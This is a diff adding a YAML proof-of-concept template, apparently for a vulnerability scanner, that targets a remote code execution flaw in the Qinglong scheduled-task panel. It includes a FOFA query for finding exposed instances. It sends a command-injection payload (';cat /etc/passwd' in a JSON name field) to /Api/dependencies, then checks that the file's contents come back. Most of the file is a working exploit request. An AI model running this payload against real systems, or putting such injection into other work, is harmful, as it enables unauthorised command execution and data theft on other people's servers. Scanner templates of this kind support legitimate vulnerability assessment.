@@ -1,0 +1,23 @@
+id: poc-yaml-qinglong-ttmp-dependencies-rce
+info:
+  name: 青龙定时任务管理面板 dependencies 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 青龙定时任务管理面板
+  fofa: app="青龙-定时任务管理面板"
+variables:
+  current_time: datetime("15:04")
+requests:
+- method: POST
+  path: /Api/dependencies
+  headers:
+    Content-Type: application/json
+  data: '[{"name":";cat /etc/passwd","type":0}]'
+  expression: status_code == 200 && contains(body,"createdAt") && contains(body,"updatedAt")
+    && contains(body,current_time) && contains(content_type,"application/json")
+- method: GET
+  path: /Api/dependencies
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,current_time) && contains(content_type,"application/json")
+transport: http
